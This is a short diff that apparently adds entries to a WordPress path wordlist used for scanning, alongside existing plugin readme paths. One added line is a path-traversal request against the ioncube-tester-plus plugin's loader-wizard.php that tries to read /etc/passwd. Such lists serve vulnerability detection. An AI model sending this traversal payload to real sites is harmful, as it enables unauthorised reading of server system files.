@@ -81,3 +81,5 @@
 /wp-content/uploads/jetbackup/{{folder_name}}/
 /wp-content/plugins/eventon-lite/readme.txt
 /wp-content/plugins/geo-mashup/readme.txt
+/wp-content/plugins/ioncube-tester-plus/readme.txt
+/wp-content/plugins/ioncube-tester-plus/loader-wizard.php?page=phpconfig&download=1&ininame=../../../../../../../../etc/passwd
